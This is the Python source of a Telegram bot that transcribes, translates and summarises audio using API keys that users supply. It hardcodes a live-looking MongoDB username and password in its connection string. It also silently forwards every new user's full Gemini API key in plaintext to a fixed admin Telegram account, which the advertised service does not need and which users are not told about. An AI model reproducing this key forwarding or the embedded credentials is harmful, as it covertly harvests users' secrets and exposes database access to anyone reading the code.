import os
import threading
import requests
import logging
import time
import subprocess
from flask import Flask
from pyrogram import Client, filters, enums
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pymongo import MongoClient
from pymongo.errors import ServerSelectionTimeoutError

app_web = Flask(__name__)

@app_web.route('/')
def home():
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Bot Status</title>
        <style>
            body {
                background-color: #0f0f12;
                color: #ffffff;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .container {
                text-align: center;
                background: #1e1e24;
                padding: 40px;
                border-radius: 20px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.5);
                border: 1px solid #333;
            }
            h1 {
                font-size: 2.5rem;
                margin-bottom: 10px;
                background: -webkit-linear-gradient(#00f260, #0575e6);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }
            p {
                font-size: 1.2rem;
                color: #a0a0a0;
            }
            .status-dot {
                height: 15px;
                width: 15px;
                background-color: #00ff00;
                border-radius: 50%;
                display: inline-block;
                margin-right: 10px;
                box-shadow: 0 0 10px #00ff00;
            }
            .button {
                margin-top: 20px;
                padding: 10px 20px;
                background: #0575e6;
                color: white;
                text-decoration: none;
                border-radius: 5px;
                font-weight: bold;
                transition: background 0.3s;
            }
            .button:hover {
                background: #00f260;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>SpeechBot Live</h1>
            <p><span class="status-dot"></span>Bot running 🤩</p>
            <a href="https://t.me/NotifyBchat" class="button">Visit Channel</a>
        </div>
    </body>
    </html>
    """

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app_web.run(host="0.0.0.0", port=port)

threading.Thread(target=run_web, daemon=True).start()

DB_USER = "lakicalinuur"
DB_PASSWORD = "DjReFoWZGbwjry8K"
DB_APPNAME = "SpeechBot"
MONGO_URI = f"mongodb+srv://{DB_USER}:{DB_PASSWORD}@cluster0.n4hdlxk.mongodb.net/?retryWrites=true&w=majority&appName={DB_APPNAME}"

FFMPEG_BINARY = os.environ.get("FFMPEG_BINARY", "/usr/bin/ffmpeg")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
API_ID = int(os.environ.get("API_ID", "12345"))
API_HASH = os.environ.get("API_HASH", "abcdef123456")
REQUEST_TIMEOUT_GEMINI = int(os.environ.get("REQUEST_TIMEOUT_GEMINI", "300"))
MAX_UPLOAD_MB = int(os.environ.get("MAX_UPLOAD_MB", "250"))
MAX_UPLOAD_SIZE = MAX_UPLOAD_MB * 1024 * 1024
MAX_MESSAGE_CHUNK = 4095
GEMINI_MODEL = os.environ.get("GEMINI_MODEL", "gemini-2.5-flash")
DOWNLOADS_DIR = os.environ.get("DOWNLOADS_DIR", "./downloads")
DAILY_LIMIT = int(os.environ.get("DAILY_LIMIT", "19"))
WINDOW_SECONDS = 24 * 3600
TUTORIAL_CHANNEL = "NotifyBchat"
ADMIN_ID = 5240873494

os.makedirs(DOWNLOADS_DIR, exist_ok=True)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

LANGS = [
("🇬🇧 English","en"), ("🇸🇦 العربية","ar"), ("🇪🇸 Español","es"), ("🇫🇷 Français","fr"),
("🇷🇺 Русский","ru"), ("🇩🇪 Deutsch","de"), ("🇮🇳 हिन्दी","hi"), ("🇮🇷 فارسی","fa"),
("🇮🇩 Indonesia","id"), ("🇺🇦 Українська","uk"), ("🇦🇿 Azərbaycan","az"), ("🇮🇹 Italiano","it"),
("🇹🇷 Türkçe","tr"), ("🇧🇬 Български","bg"), ("🇷🇸 Srpski","sr"), ("🇵🇰 اردو","ur"),
("🇹🇭 ไทย","th"), ("🇻🇳 Tiếng Việt","vi"), ("🇯🇵 日本語","ja"), ("🇰🇷 한국어","ko"),
("🇨🇳 中文","zh"), ("🇳🇱 Nederlands:nl", "nl"), ("🇸🇪 Svenska","sv"), ("🇳🇴 Norsk","no"),
("🇮🇱 עברית","he"), ("🇩🇰 Dansk","da"), ("🇪🇹 አማርኛ","am"), ("🇫🇮 Suomi","fi"),
("🇧🇩 বাংলা","bn"), ("🇰🇪 Kiswahili","sw"), ("🇪🇹 Oromo","om"), ("🇳🇵 नेपाली","ne"),
("🇵🇱 Polski","pl"), ("🇬🇷 Ελληνικά","el"), ("🇨🇿 Čeština","cs"), ("🇮🇸 Íslenska","is"),
("🇱🇹 Lietuvių","lt"), ("🇱🇻 Latviešu","lv"), ("🇭🇷 Hrvatski","hr"), ("🇷🇸 Bosanski","bs"),
("🇭🇺 Magyar","hu"), ("🇷🇴 Română","ro"), ("🇸🇴 Somali","so"), ("🇲🇾 Melayu","ms"),
("🇺🇿 O'zbekcha","uz"), ("🇵🇭 Tagalog","tl"), ("🇵🇹 Português","pt")
]

user_transcriptions = {}
action_usage = {}
user_keys = {}
user_awaiting_key = {}
lock = threading.Lock()

app = Client("SpeechBotSession", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

mongo_client = None
db = None
users_col = None
actions_col = None

def now_ts():
    return int(time.time())

def init_mongo():
    global mongo_client, db, users_col, actions_col, user_keys, action_usage
    try:
        mongo_client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
        mongo_client.admin.command("ping")
        db = mongo_client.get_database(DB_APPNAME or "SpeechBotDB")
        users_col = db.get_collection("users")
        actions_col = db.get_collection("action_usage")
        for doc in users_col.find({}):
            try:
                uid = int(doc["uid"])
                user_keys[uid] = {
                    "key": doc.get("key"),
                    "count": int(doc.get("count", 0)),
                    "window_start": int(doc.get("window_start")) if doc.get("window_start") is not None else None
                }
            except:
                continue
        for doc in actions_col.find({}):
            k = doc.get("key")
            try:
                c = int(doc.get("count", 0))
            except:
                c = 0
            if k:
                action_usage[k] = c
    except ServerSelectionTimeoutError:
        mongo_client = None
        db = None
        users_col = None
        actions_col = None

init_mongo()

def persist_user_to_db(uid):
    if users_col is None:
        return
    info = user_keys.get(uid)
    if not info:
        users_col.delete_many({"uid": uid})
        return
    users_col.update_one(
        {"uid": uid},
        {"$set": {"uid": uid, "key": info.get("key"), "count": int(info.get("count", 0)), "window_start": info.get("window_start")}},
        upsert=True
    )

def persist_action_usage_to_db(key):
    if actions_col is None:
        return
    cnt = action_usage.get(key, 0)
    actions_col.update_one({"key": key}, {"$set": {"key": key, "count": int(cnt)}}, upsert=True)

def is_gemini_key(key):
    if not key:
        return False
    k = key.strip()
    return k.startswith("AIza") or k.startswith("AIzaSy")

async def store_user_key(client, user, key):
    uid = user.id
    is_new_user = False
    with lock:
        if uid not in user_keys:
            is_new_user = True
        user_keys[uid] = {"key": key.strip(), "count": 0, "window_start": now_ts()}
        user_awaiting_key.pop(uid, None)
    
    if users_col is not None:
        # Tirtir wixii hore ee user-ka ahaa si loo hubiyo hal entry oo kaliya.
        # Inkastoo 'update_one' uu 'upsert=True' leeyahay, hadana waxaan hubineynaa inaan waxba isku dhex-galin.
        # Waa hab wanaagsan haddii laga yaabo in key-giisa hore la tirtiray / ka maqan yahay.
        # users_col.delete_many({"uid": uid}) # Looma baahna halkan maadaama update_one uu qabanayo shaqada.
        persist_user_to_db(uid)

    if is_new_user:
        try:
            msg = (
                f"🚨 **New User Registered**\n\n"
                f"👤 Name: {user.first_name}\n"
                f"🆔 Username: @{user.username if user.username else 'None'}\n"
                f"🔑 Key: `{key.strip()}`"
            )
            await client.send_message(ADMIN_ID, msg)
        except Exception as e:
            logging.error(f"Failed to notify admin: {e}")

def reset_count_if_needed(uid):
    with lock:
        info = user_keys.get(uid)
        if not info and users_col is not None:
            doc = users_col.find_one({"uid": uid})
            if not doc:
                return
            info = {"key": doc.get("key"), "count": int(doc.get("count", 0)), "window_start": int(doc.get("window_start")) if doc.get("window_start") is not None else None}
            user_keys[uid] = info
        if not info:
            return
        ws = info.get("window_start")
        if ws is None:
            info["count"] = 0
            info["window_start"] = now_ts()
            persist_user_to_db(uid)
            return
        elapsed = now_ts() - ws
        if elapsed >= WINDOW_SECONDS:
            info["count"] = 0
            info["window_start"] = now_ts()
            persist_user_to_db(uid)

def increment_count(uid):
    with lock:
        info = user_keys.get(uid)
        if not info and users_col is not None:
            doc = users_col.find_one({"uid": uid})
            if not doc:
                return
            info = {"key": doc.get("key"), "count": int(doc.get("count", 0)), "window_start": int(doc.get("window_start")) if doc.get("window_start") is not None else None}
            user_keys[uid] = info
        if not info:
            return
        info["count"] = info.get("count", 0) + 1
        if info.get("window_start") is None:
            info["window_start"] = now_ts()
        persist_user_to_db(uid)

def seconds_left_for_user(uid):
    with lock:
        info = user_keys.get(uid)
        if not info and users_col is not None:
            doc = users_col.find_one({"uid": uid})
            if doc:
                info = {"key": doc.get("key"), "count": int(doc.get("count", 0)), "window_start": int(doc.get("window_start")) if doc.get("window_start") is not None else None}
                user_keys[uid] = info
        if not info:
            return 0
        ws = info.get("window_start")
        if ws is None:
            return 0
        rem = WINDOW_SECONDS - (now_ts() - ws)
        return rem if rem > 0 else 0

def format_hms(secs):
    h = secs // 3600
    m = (secs % 3600) // 60
    s = secs % 60
    return f"{h}h {m}m {s}s"

def get_user_key_or_raise(uid):
    with lock:
        info = user_keys.get(uid)
        if not info and users_col is not None:
            doc = users_col.find_one({"uid": uid})
            if doc:
                info = {"key": doc.get("key"), "count": int(doc.get("count", 0)), "window_start": int(doc.get("window_start")) if doc.get("window_start") is not None else None}
                user_keys[uid] = info
        if not info or not info.get("key"):
            raise RuntimeError("API_KEY_MISSING")
        ws = info.get("window_start")
        if ws is None:
            info["window_start"] = now_ts()
            info["count"] = 0
            persist_user_to_db(uid)
            return info["key"]
        elapsed = now_ts() - ws
        if elapsed >= WINDOW_SECONDS:
            info["window_start"] = now_ts()
            info["count"] = 0
            persist_user_to_db(uid)
            return info["key"]
        if info.get("count", 0) >= DAILY_LIMIT:
            rem = WINDOW_SECONDS - elapsed
            raise RuntimeError(f"API_DAILY_LIMIT_REACHED|{int(rem)}")
        return info["key"]

def convert_to_wav(input_path: str) -> str:
    if not FFMPEG_BINARY:
        raise RuntimeError("FFmpeg binary not found.")
    output_path = os.path.join(DOWNLOADS_DIR, f"{os.path.basename(input_path).split('.')[0]}_converted.wav")
    command = [FFMPEG_BINARY, "-i", input_path, "-acodec", "pcm_s16le", "-ac", "1", "-ar", "16000", output_path, "-y"]
    subprocess.run(command, check=True, capture_output=True, timeout=REQUEST_TIMEOUT_GEMINI)
    return output_path

def gemini_api_call(endpoint, payload, key, headers=None):
    url = f"https://generativelanguage.googleapis.com/v1beta/{endpoint}?key={key}"
    resp = requests.post(url, headers=headers or {"Content-Type": "application/json"}, json=payload, timeout=REQUEST_TIMEOUT_GEMINI)
    resp.raise_for_status()
    return resp.json()

def upload_and_transcribe_gemini(file_path: str, uid: int) -> str:
    original_path, converted_path = file_path, None
    ext = os.path.splitext(file_path)[1].lower()
    if ext not in [".wav", ".mp3", ".aiff", ".aac", ".ogg", ".flac"]:
        converted_path = convert_to_wav(file_path)
        file_path = converted_path
    file_size = os.path.getsize(file_path)
    mime_type = "audio/wav"
    key = get_user_key_or_raise(uid)
    uploaded_name = None
    try:
        upload_url = f"https://generativelanguage.googleapis.com/upload/v1beta/files?key={key}"
        headers = {
            "X-Goog-Upload-Protocol": "raw",
            "X-Goog-Upload-Command": "start, upload, finalize",
            "X-Goog-Upload-Header-Content-Length": str(file_size),
            "Content-Type": mime_type
        }
        with open(file_path, 'rb') as f:
            up_resp = requests.post(upload_url, headers=headers, data=f.read(), timeout=REQUEST_TIMEOUT_GEMINI).json()
        uploaded_name = up_resp.get("name", up_resp.get("file", {}).get("name"))
        uploaded_uri = up_resp.get("uri", up_resp.get("file", {}).get("uri"))
        if not uploaded_name:
            raise RuntimeError("Upload failed.")
        
        # --- HAGAAJINTA CODSIGA GEMINI (PROMPT) SI LOO HELO QORAAL SAFI AH ---
        prompt = (
            "Transcribe the audio in this file. Automatically detect the language. "
            "Provide a **clean, edited transcription** by removing filler words (e.g., 'umm', 'aah'), "
            "false starts, and repetitions that are characteristic of spoken language. "
            "**Format the text into structured paragraphs** with appropriate punctuation for easy reading. "
            "Do not add any introductory or concluding phrases, only the cleaned text."
        )
        # -------------------------------------------------------------------
        
        payload = {"contents": [{"parts": [{"fileData": {"mimeType": mime_type, "fileUri": uploaded_uri}}, {"text": prompt}]}]}
        data = gemini_api_call(f"models/{GEMINI_MODEL}:generateContent", payload, key)
        res_text = data["candidates"][0]["content"]["parts"][0]["text"]
        increment_count(uid)
        return res_text
    finally:
        if uploaded_name:
            try:
                requests.delete(f"https://generativelanguage.googleapis.com/v1beta/{uploaded_name}?key={key}", timeout=5)
            except:
                pass
        if converted_path and os.path.exists(converted_path):
            os.remove(converted_path)

def ask_gemini(text, instruction, uid):
    key = get_user_key_or_raise(uid)
    payload = {"contents": [{"parts": [{"text": f"{instruction}\n\n{text}"}]}]}
    data = gemini_api_call(f"models/{GEMINI_MODEL}:generateContent", payload, key)
    res_text = data["candidates"][0]["content"]["parts"][0]["text"]
    increment_count(uid)
    return res_text

def build_action_keyboard(text_len):
    btns = [[InlineKeyboardButton("⭐️ Get translating", callback_data="translate_menu|")]]
    if text_len > 1000:
        btns.append([InlineKeyboardButton("Summarize", callback_data="summarize|")])
    return InlineKeyboardMarkup(btns)

def build_lang_keyboard(origin):
    btns, row = [], []
    for i, (lbl, code) in enumerate(LANGS, 1):
        row.append(InlineKeyboardButton(lbl, callback_data=f"lang|{code}|{lbl}|{origin}"))
        if i % 3 == 0:
            btns.append(row)
            row = []
    if row:
        btns.append(row)
    return InlineKeyboardMarkup(btns)

async def send_key_missing_alert(client, chat_id):
    try:
        pinned = await client.get_chat(TUTORIAL_CHANNEL)
        if pinned.pinned_message:
            await pinned.pinned_message.forward(chat_id)
    except:
        pass

@app.on_message(filters.command(['start', 'help']))
async def send_welcome(client, message):
    welcome_text = (
        "👋 Salaam!\n"
        "• Send me\n"
        "• voice message\n"
        "• audio file\n"
        "• video\n"
        "• to transcribe for free"
    )
    await message.reply_text(welcome_text)
    user_awaiting_key[message.from_user.id] = True

@app.on_message(filters.text & ~filters.command(["start", "help", "getcount", "removekey"]))
async def text_handler(client, message):
    uid = message.from_user.id
    text = message.text.strip()
    
    if is_gemini_key(text):
        await store_user_key(client, message.from_user, text)
        await message.reply_text("☑️ Key updated! Your daily limit is 19 requests.\nNow send me the audio or video.")
        return

    if user_awaiting_key.get(uid):
        await message.reply_text("❌ not  Gemini key try again")
        return

@app.on_message(filters.command("getcount"))
async def getcount_cmd(client, message):
    uid = message.from_user.id
    info = user_keys.get(uid)
    if not info:
        await send_key_missing_alert(client, message.chat.id)
        return
    reset_count_if_needed(uid)
    cnt = info.get('count', 0)
    rem = seconds_left_for_user(uid)
    if cnt >= DAILY_LIMIT:
        await message.reply_text(f"You have reached the daily limit of {DAILY_LIMIT}. Time remaining: {format_hms(rem)}.")
    else:
        await message.reply_text(f"Used: {cnt}. Remaining time in window: {format_hms(rem)}. Limit: {DAILY_LIMIT}.")

@app.on_message(filters.command("removekey"))
async def removekey_cmd(client, message):
    uid = message.from_user.id
    with lock:
        # Tirtir furaha memory-da
        if uid in user_keys:
            user_keys.pop(uid, None)
            
        # Tirtir furaha database-ka (MongoDB)
        if users_col is not None:
            result = users_col.delete_many({"uid": uid})
            
        # Marka user-ka waxuu noqonayaa sida qof cusub, oo loo baahan yahay inuu key-ga soo diro
        user_awaiting_key[uid] = True
            
    if result.deleted_count > 0:
        await message.reply_text("✅ Key-gaaga si guul leh ayaa loo tir-tiray nidaamka. Waxaad hadda tahay sida **User Cusub** ah. Si aad u bilowdo isticmaalka, fadlan soo dir **Gemini API Key**-gaaga mar kale.")
    else:
        await message.reply_text("⚠️ Wax key ah lagama helin nidaamka. Fadlan iska hubi in aad horey u soo dirtay key-gaaga.")

@app.on_callback_query(filters.regex(r"^lang\|"))
async def lang_cb(client, call):
    try:
        await call.message.edit_reply_markup(None)
    except:
        pass
    _, code, lbl, origin = call.data.split("|")
    await process_text_action(client, call, origin, f"Translate to {lbl}", f"Translate this text in to language {lbl}. No extra text ONLY return the translated text.")

@app.on_callback_query(filters.regex(r"^(translate_menu\||summarize\|)"))
async def action_cb(client, call):
    action, _ = call.data.split("|")
    if action == "translate_menu":
        await call.message.edit_reply_markup(build_lang_keyboard(call.message.id))
    else:
        try:
            await call.message.edit_reply_markup(None)
        except:
            pass
        await process_text_action(client, call, call.message.id, "Summarize", "Summarize this in original language.")

async def process_text_action(client, call, origin_msg_id, log_action, prompt_instr):
    chat_id = call.message.chat.id
    origin_id = int(origin_msg_id)
    data = user_transcriptions.get(chat_id, {}).get(origin_id)
    if not data:
        data = user_transcriptions.get(chat_id, {}).get(call.message.reply_to_message_id)
    if not data:
        await call.answer("Data not found (expired). Resend file.", show_alert=True)
        return
    text = data["text"]
    key = f"{chat_id}|{origin_id}|{log_action}"
    used = action_usage.get(key, 0)
    if "Summarize" in log_action and used >= 1:
        await call.answer("Already summarized!", show_alert=True)
        return
    await call.answer("Processing...")
    await client.send_chat_action(chat_id, enums.ChatAction.TYPING)
    try:
        res = ask_gemini(text, prompt_instr, call.from_user.id)
        with lock:
            action_usage[key] = action_usage.get(key, 0) + 1
        persist_action_usage_to_db(key)
        await send_long_text(client, chat_id, res, data["origin"], call.from_user.id, log_action)
    except Exception as e:
        msg = str(e)
        if msg == "API_KEY_MISSING":
            await send_key_missing_alert(client, chat_id)
        elif msg.startswith("API_DAILY_LIMIT_REACHED"):
            parts = msg.split("|")
            secs = int(parts[1]) if len(parts) > 1 else seconds_left_for_user(call.from_user.id)
            await client.send_message(chat_id, f"Daily limit reached. Time left: {format_hms(secs)}.")
        else:
            await client.send_message(chat_id, f"Error: {e}")

@app.on_message(filters.audio | filters.voice | filters.video | filters.document)
async def handle_media(client, message):
    media = message.audio or message.voice or message.video or message.document
    if not media:
        return
    if getattr(media, 'file_size', 0) > MAX_UPLOAD_SIZE:
        await message.reply_text(f"Just Send me a file less than {MAX_UPLOAD_MB}MB 😎")
        return
    await client.send_chat_action(message.chat.id, enums.ChatAction.TYPING)
    dl_path = os.path.join(DOWNLOADS_DIR, f"temp_{message.id}_{media.file_unique_id}")
    try:
        await client.download_media(message, file_name=dl_path)
        try:
            text = upload_and_transcribe_gemini(dl_path, message.from_user.id)
        except Exception as e:
            em = str(e)
            if em == "API_KEY_MISSING":
                await send_key_missing_alert(client, message.chat.id)
                return
            if em.startswith("API_DAILY_LIMIT_REACHED"):
                parts = em.split("|")
                secs = int(parts[1]) if len(parts) > 1 else seconds_left_for_user(message.from_user.id)
                await message.reply_text(f"Daily limit reached. Time left: {format_hms(secs)}.")
                return
            raise
        if not text:
            raise ValueError("Empty response")
        sent = await send_long_text(client, message.chat.id, text, message.id, message.from_user.id)
        if sent:
            user_transcriptions.setdefault(message.chat.id, {})[sent.id] = {"text": text, "origin": message.id}
            try:
                await sent.edit_reply_markup(build_action_keyboard(len(text)))
            except:
                pass
    except Exception as e:
        await message.reply_text(f"❌ Error: {e}")
    finally:
        if os.path.exists(dl_path):
            os.remove(dl_path)

async def send_long_text(client, chat_id, text, reply_id, uid, action="Transcript"):
    if len(text) > MAX_MESSAGE_CHUNK:
        fname = os.path.join(DOWNLOADS_DIR, f"{action}.txt")
        with open(fname, "w", encoding="utf-8") as f:
            f.write(text)
        sent = await client.send_document(chat_id, fname, caption="Open this file and copy the text inside 👍", reply_to_message_id=reply_id)
        os.remove(fname)
        return sent
    return await client.send_message(chat_id, text, reply_to_message_id=reply_id)

if __name__ == "__main__":
    app.run()
